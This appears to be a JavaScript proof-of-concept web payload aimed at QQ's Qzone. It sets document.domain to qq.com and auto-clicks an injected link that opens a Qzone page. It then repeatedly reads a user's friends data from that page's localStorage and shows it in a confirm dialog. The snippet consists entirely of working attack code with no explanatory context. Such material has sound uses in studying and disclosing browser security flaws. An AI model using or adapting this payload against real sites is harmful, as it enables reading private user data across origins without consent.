document.domain="qq.com";
var a = document.createElement("a");
a.setAttribute("target","_blank");
a.onclick = function(){
  setTimeout('ccc=window.open("https://user.qzone.qq.com/troubleshooter?traytip");setInterval(\'confirm(ccc.localStorage.getItem("app_friends_649114132"))\',3000)',1000);
}
a.id="xxx";
document.body.appendChild(a);
document.getElementById("xxx").click()
